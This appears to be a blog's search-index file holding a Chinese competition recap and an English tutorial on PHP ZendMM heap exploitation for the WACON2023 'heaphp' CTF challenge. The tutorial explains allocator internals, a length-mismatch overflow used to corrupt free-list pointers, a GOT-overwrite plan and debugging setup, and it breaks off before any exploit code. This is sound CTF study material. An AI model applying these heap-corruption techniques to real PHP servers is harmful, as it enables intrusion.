<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>强网拟态异闻录</title>
      <link href="/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%BC%82%E9%97%BB%E5%BD%95/"/>
      <url>/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%BC%82%E9%97%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>很久没打过这么久的线下了。</p><p>在南京，持续72小时，和世界各地的强力战队同台竞技。不得不说，听起来挺酷。</p><h1 id="我在南京遇到困难睡大觉"><a href="#我在南京遇到困难睡大觉" class="headerlink" title="我在南京遇到困难睡大觉"></a>我在南京遇到困难睡大觉</h1><p>之前从来没有接触过iot、iov一类的东西，于是我在比赛前一周开始零零散散地学。最后感觉有了一点固件分析和日路由器的基础; 车联网方面能找到的资料大多比较模糊零散且抽象，没有实际上手过，最后还是一头雾水。</p><p>实际上比赛中占大头的还是车联网。这个赛道包含t-box、ADAS黑白盒渗透，还有一个实地日车的挑战。</p><p>t-box黑盒题中有几个设备提供了arm固件，但是分析之后我确实找不到如何下手。有的看起来是一道逆向题，然而就算给出正确的输入，最后拿到的也不是题目要求的flag，此外也没有别的漏洞可以利用。还有一道存在一个数组2byte的越界，但是这个越界没有任何卵用，只能覆盖一个垃圾变量。或许调的libc存在漏洞？我没找到。</p><p>别的车联网相关利用就超出我的知识范围了，只能帮队友试试弱密码，找找敏感文件。属于参与感不强。不过看队友伪造CAN报文什么的还是挺炫酷，可能以后研究一下这方面？</p><p>此外比赛还有传统的ctf，不过并不计入总分，而是获取挑战其他题目资格的途径。做了道qiling框架的栈溢出，不过没啥新东西，最后还因为手输flag字符串导致末尾带\n，orw读不出来，debug了两个小时。度过了一段相对失败的比赛时间。</p><h1 id="我去，ALLES"><a href="#我去，ALLES" class="headerlink" title="我去，ALLES!"></a>我去，ALLES!</h1><p>之前因为一个比较喜欢的youtube博主LiveOverflow，了解到了他所在的这个德国战队。看到这次比赛邀请了ALLES，我还挺期待，虽然最后他没有来。</p><p>比赛第三天的时候，我还是受不了8：30出发的作息，于是睡大觉到了十一点。出门打车时，在酒店门口偶遇了ALLES!的三个哥们（有一个还没下来）。</p><p>于是我社交大师属性大爆发，上前搭讪。顺便问了问他们对这次比赛的看法，几位老哥很热情，轮流说了一大堆。总的来说就是比赛题目很有新意、也很难，顺便吐槽了以下这次比赛的文档”like random English words”，令人难绷。</p><p>不得不说，在这次国际战队普遍开摆的情况下，ALLES老哥反而玩的挺开心，还冲到了车联网前几。</p><h1 id="小厨娘与上流酒店"><a href="#小厨娘与上流酒店" class="headerlink" title="小厨娘与上流酒店"></a>小厨娘与上流酒店</h1><p>连着比赛几天，都是送的同一家店的盒饭（xx小厨娘），口味应该达到了生命体征维持餐的标准。除了第二天晚上送的是麦麦，不过每人只有一份汉堡和鸡翅，这种主办方就该被逐出麦门！</p><p>酒店倒挺豪华，每天还送一个水果。缺点是每天早上大家抢着吃早饭，电梯和餐厅的容量都不足以应对瞬时人流而接近瘫痪。还好我后面早上都睡大觉。</p><hr><p>iov渗透看起来还挺好玩，以后有空学学。</p><p>不过短期目标还是先考好这个B期末吧，不然以后想读研没学上了</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摸 </tag>
            
            <tag> iot </tag>
            
            <tag> iov </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A Brief Introduction to PHP Heap Exploitation</title>
      <link href="/php-pwn/"/>
      <url>/php-pwn/</url>
      
        <content type="html"><![CDATA[<p>It&#96;s my first time encountering this fancy pwn item, known as Web Pwn, on WACON2023. I have few experience on php coding, so it spent me a long time to figure out how ZendMM actually works.</p><h1 id="The-Memory-Management-of-Zend-Engine"><a href="#The-Memory-Management-of-Zend-Engine" class="headerlink" title="The Memory Management of Zend Engine"></a>The Memory Management of Zend Engine</h1><p>PHP codes are explained through the <strong>Zend engine</strong>. Instead of directly using traditional <code>malloc</code> and <code>free</code> to manage memory, Zend uses <strong>ZendMM</strong> to allocate and release memory through <code>emalloc</code> and <code>efree</code> , which efficiently serves PHP request-bound machanisms (that&#96;s another topic). </p><h2 id="Basic-Structure"><a href="#Basic-Structure" class="headerlink" title="Basic Structure"></a>Basic Structure</h2><p>As writen in <code>zend_alloc.c</code> source code, all allocations are split into 3 categories: huge, large and small. Remember that zend_alloc allocates memory form OS by <strong>CHUNKS</strong>, which contains 2MB memories. Huge allocs are those who exceed a chunk. And zend_alloc use  <code>mmap</code> to allocate one. The concept of <strong>PAGE</strong> is commonly used in ZendMM, which usually contains 4KB memories. That&#96;s to say, a chunk contains 512 pages. Small allocs are less than 3&#x2F;4 of page size. The rest are Large allocs.</p><p><img src="/../img/php-pwn.assets/image-20231209221140856.png" alt="image-20231209221140856"></p><p>Each time a chunk is alloced, the first page of the chunk is used to record basic information about the chunk. The Structure recording information is <code>_zend_mm_chunk</code> ,(which doesn&#96;t appear in huge chunk)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_chunk</span> &#123;</span></span><br><span class="line">zend_mm_heap      *heap;</span><br><span class="line">zend_mm_chunk     *next;</span><br><span class="line">zend_mm_chunk     *prev;</span><br><span class="line"><span class="type">uint32_t</span>           free_pages;<span class="comment">/* number of free pages */</span></span><br><span class="line"><span class="type">uint32_t</span>           free_tail;               <span class="comment">/* number of free pages at the end of chunk */</span></span><br><span class="line"><span class="type">uint32_t</span>           num;</span><br><span class="line"><span class="type">char</span>               reserve[<span class="number">64</span> - (<span class="keyword">sizeof</span>(<span class="type">void</span>*) * <span class="number">3</span> + <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>) * <span class="number">3</span>)];</span><br><span class="line">zend_mm_heap       heap_slot;               <span class="comment">/* used only in main chunk */</span></span><br><span class="line">zend_mm_page_map   free_map;                <span class="comment">/* 512 bits or 64 bytes */</span></span><br><span class="line">zend_mm_page_info  <span class="built_in">map</span>[ZEND_MM_PAGES];      <span class="comment">/* 2 KB = 512 * 4 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>All the chunks form a double linked list (<code>*next</code>, <code>*prev</code>). A chunk records the usage and other detailed information of its 512 pages through <code>zend_mm_page_map</code>, <code>zend_mm_page_info</code>. Also, the <code>zend_mm_heap</code> structure merits attention.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_heap</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="type">int</span>                use_custom_heap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STORAGE</span></span><br><span class="line">zend_mm_storage   *storage;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             size;                    <span class="comment">/* current memory usage */</span></span><br><span class="line"><span class="type">size_t</span>             peak;                    <span class="comment">/* peak memory usage */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">zend_mm_free_slot *free_slot[ZEND_MM_BINS]; <span class="comment">/* free lists for small sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT || ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             real_size;               <span class="comment">/* current size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="type">size_t</span>             real_peak;               <span class="comment">/* peak size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_LIMIT</span></span><br><span class="line"><span class="type">size_t</span>             limit;                   <span class="comment">/* memory limit */</span></span><br><span class="line"><span class="type">int</span>                overflow;                <span class="comment">/* memory overflow flag */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">zend_mm_huge_list *huge_list;               <span class="comment">/* list of huge allocated blocks */</span></span><br><span class="line"></span><br><span class="line">zend_mm_chunk     *main_chunk;</span><br><span class="line">zend_mm_chunk     *cached_chunks;<span class="comment">/* list of unused chunks */</span></span><br><span class="line"><span class="type">int</span>                chunks_count;<span class="comment">/* number of allocated chunks */</span></span><br><span class="line"><span class="type">int</span>                peak_chunks_count;<span class="comment">/* peak number of allocated chunks for current request */</span></span><br><span class="line"><span class="type">int</span>                cached_chunks_count;<span class="comment">/* number of cached chunks */</span></span><br><span class="line"><span class="type">double</span>             avg_chunks_count;<span class="comment">/* average number of chunks allocated per request */</span></span><br><span class="line"><span class="type">int</span>                last_chunks_delete_boundary; <span class="comment">/* number of chunks after last deletion */</span></span><br><span class="line"><span class="type">int</span>                last_chunks_delete_count;    <span class="comment">/* number of deletion over the last boundary */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span>);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">&#125; <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span> ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>       (*_free)(<span class="type">void</span>*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line"><span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">&#125; debug;</span><br><span class="line">&#125; custom_heap;</span><br><span class="line">HashTable *tracked_allocs;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Mind the <code>zend_mm_free_slot</code>. The <code>ZEND_MM_BINS</code> usually is 30, which means there are 30 fixed size for small runs. As a result, there are 30 single linked list.</p><h2 id="Vulnerable-Small-Runs"><a href="#Vulnerable-Small-Runs" class="headerlink" title="Vulnerable Small Runs"></a>Vulnerable Small Runs</h2><p>We mainly focus on small runs, because its vulnerable.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_never_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small_slow</span><span class="params">(zend_mm_heap *heap, <span class="type">uint32_t</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);</span><br><span class="line">page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num] = ZEND_MM_SRUN(bin_num);</span><br><span class="line"><span class="keyword">if</span> (bin_pages[bin_num] &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="type">uint32_t</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">chunk-&gt;<span class="built_in">map</span>[page_num+i] = ZEND_MM_NRUN(bin_num, i);</span><br><span class="line">i++;</span><br><span class="line">&#125; <span class="keyword">while</span> (i &lt; bin_pages[bin_num]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a linked list of elements from 1 to last */</span></span><br><span class="line">end = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - <span class="number">1</span>)));</span><br><span class="line">heap-&gt;free_slot[bin_num] = p = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + bin_data_size[bin_num]);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">p-&gt;next_free_slot = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">p = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line">&#125; <span class="keyword">while</span> (p != end);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This function is mainly used for building the small run chain when allocating  a chunk. It explains how 30 single linked chains are built. Because each part of the chain doesn&#96;t have to contain a header about its size, only leaving the fd, we may find the weird scene (compared to glibc) in the memory.</p><p><img src="/../img/php-pwn.assets/image-20230914220353292.png" alt="image-20230914220353292"> </p><p>When we allocate a small run:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small</span><span class="params">(zend_mm_heap *heap, <span class="type">int</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">size_t</span> size = heap-&gt;size + bin_data_size[bin_num];</span><br><span class="line"><span class="type">size_t</span> peak = MAX(heap-&gt;peak, size);</span><br><span class="line">heap-&gt;size = size;</span><br><span class="line">heap-&gt;peak = peak;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EXPECTED(heap-&gt;free_slot[bin_num] != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">zend_mm_free_slot *p = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p-&gt;next_free_slot;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When we release a small run:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> <span class="title function_">zend_mm_free_small</span><span class="params">(zend_mm_heap *heap, <span class="type">void</span> *ptr, <span class="type">int</span> bin_num)</span></span><br><span class="line">&#123;</span><br><span class="line">zend_mm_free_slot *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">heap-&gt;size -= bin_data_size[bin_num];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">p = (zend_mm_free_slot*)ptr;</span><br><span class="line">p-&gt;next_free_slot = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Both of the functions lake security checks .If we replace the fd of it by out target address, we get an arbitrary address allocate!  That makes small runs vulnerable.</p><h1 id="WACON2023-heaphp"><a href="#WACON2023-heaphp" class="headerlink" title="WACON2023-heaphp"></a>WACON2023-heaphp</h1><p>A typical php-pwn, we are given a docker environment and a vulnerable php extension module heaphp.so.</p><p>It took me quite a long time building local php environment following the guideline on blogs. I complied php locally aming to debug it easily.  <a href="https://learnku.com/docs/php-internals/php7/building_php/6840">This document</a> helped a lot. However, if you try to complie php with debug-symbol, the ABI of the binary will change, which makes your extension unable to load properly. That ‘s actually what I encountered. </p><p>So, What ‘s the point of it ? I don ‘t know.</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>All protection is on except Partial RELRO .The extension mainly consists of 5 functions: add, view, edit, list, delete. Because of zend engine, the pseudo-code are hard to understand (especially for noobs like me). There are tons of code of uncertain significance like:</p><p><img src="/../img/php-pwn.assets/image-20230914223544720.png" alt="image-20230914223544720"></p><p>Then we must dig into the basic data type in zend. That`s <code>_zend_value</code> and <code>_zval_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">zend_long         lval;<span class="comment">/* long value */</span></span><br><span class="line"><span class="type">double</span>            dval;<span class="comment">/* double value */</span></span><br><span class="line">zend_refcounted  *counted;</span><br><span class="line">zend_string      *str;</span><br><span class="line">zend_array       *arr;</span><br><span class="line">zend_object      *obj;</span><br><span class="line">zend_resource    *res;</span><br><span class="line">zend_reference   *ref;</span><br><span class="line">zend_ast_ref     *ast;</span><br><span class="line">zval             *zv;</span><br><span class="line"><span class="type">void</span>             *ptr;</span><br><span class="line">zend_class_entry *ce;</span><br><span class="line">zend_function    *func;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> w1;</span><br><span class="line"><span class="type">uint32_t</span> w2;</span><br><span class="line">&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">zend_value        value;<span class="comment">/* value */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> type_info;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">ZEND_ENDIAN_LOHI_3(</span><br><span class="line">zend_uchar    type,<span class="comment">/* active type */</span></span><br><span class="line">zend_uchar    type_flags,</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u)</span><br><span class="line">&#125; v;</span><br><span class="line">&#125; u1;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line"><span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line"><span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line"><span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line"><span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line"><span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line"><span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line"><span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>That`s quite a complex structure, if we replace the meaningless <code>__int64 xx</code> with corresponding zend data type, then it will be easier to comprehend.</p><p>by the way, the form of parameters looks weird</p><p><img src="/../img/php-pwn.assets/image-20230914225045011.png" alt="image-20230914225045011"></p><p>It doesn`t mean takeing exactly 2 parameters. In fact,  <code>a1</code> stands for the input args (parsed by something like <code>zend_parse_arg</code>), while <code>a2</code> stands for the return values. We may set type of <code>a1</code> to be <code>zend_execute_data *</code> and <code>a2</code> to be <code>zval *</code>. In practice, I set <code>a1</code> to be <code>_zval_struct *</code> for better comprehension.</p><p>After checking the declaration, the meaning of following parts a clear. (take <code>zif_add_note</code> for example)</p><p><img src="/../img/php-pwn.assets/image-20230915121612049.png" alt="image-20230915121612049"></p><p><code>v2</code> represents the total number of parameters, and here should be 2.</p><p><img src="/../img/php-pwn.assets/image-20230915121952724.png" alt="image-20230915121952724"></p><p>Here comes a type check. Refering the table and we find ‘6’ represents string. So arg1 should be a string ptr, and will be copied to <code>v4</code>.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>zif_add_note</code> use <code>strlen</code> to caculate the length of input string and allocate corresponding memory. However, when using <code>memcpy</code> to copy content, the 3rd argument taken is the actual length of string. The consequences is that string can be cut off by NULL, which means we can overwrite the next memory`s fd.</p><p><code>zif_add_note</code> also contains an off by NULL Vulnerability.But who cares?</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Since Partial RELRO is on, we can overwrite GOT table. Before that, we must leak the address of heap.so and libc.so.</p><h3 id="Debuging-Tricks"><a href="#Debuging-Tricks" class="headerlink" title="Debuging Tricks"></a>Debuging Tricks</h3><p>To load the target extension, you should put the extension in correct path. To find the path, run</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">php -i | grep -i extension_dir</span></span><br></pre></td></tr></table></figure><p>And modify the php.ini file. You can <code>find</code> it in root directory.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo find / -name <span class="string">&quot;php.ini&quot;</span></span></span><br></pre></td></tr></table></figure><p>Add the config at the file end</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=heaphp.so</span><br></pre></td></tr></table></figure><p>After that, you can check if it`s properly loaded by <code>phpinfo</code> or checking the <code>/proc/[pid]/maps</code> when running php.</p><p>To debug the extension, we run php with gdb attached first</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb php</span></span><br></pre></td></tr></table></figure><p>Then we <code>run</code> it and press <code>Ctrl+c</code> to interrupt it. Check the <code>vmmap</code> , you may find heaphp.so is loaded.</p><p>We can set breakpoints now. Don&#96;t forget to set our exploit script as argument.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">set</span> args ./exp.php</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">b zif_add_notes</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">run</span></span><br></pre></td></tr></table></figure><p>You can also write them in a gdb script.</p><h2 id="Address-Leak"><a href="#Address-Leak" class="headerlink" title="Address Leak"></a>Address Leak</h2><p>Through overwrite the content pointer of any notes, we may get content of arbitrary address through <code>zif_view_note</code>.</p><p>First step, we can leak an fd pointer (by <code>zif_view_note</code> or <code>zif_list_note</code> ). Our heap memory was allocated by mmap anonymously, it doesn&#96;t have a constant offset with libc.so or heaphp.so.</p><p><img src="/../img/php-pwn.assets/image-20230915150945514.png" alt="image-20230915150945514"></p><p>However, we may find a pointer related to libc.so or heaphp.so on the heap. It could be extremely hard to find one through analyzing the source code. But I found a useful tool in pwndbg.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usage: leakfind [-h] [-p [PAGE_NAME]] [-o [MAX_OFFSET]] [-d [MAX_DEPTH]] [-s [STEP]] [--negative_offset [NEGATIVE_OFFSET]] 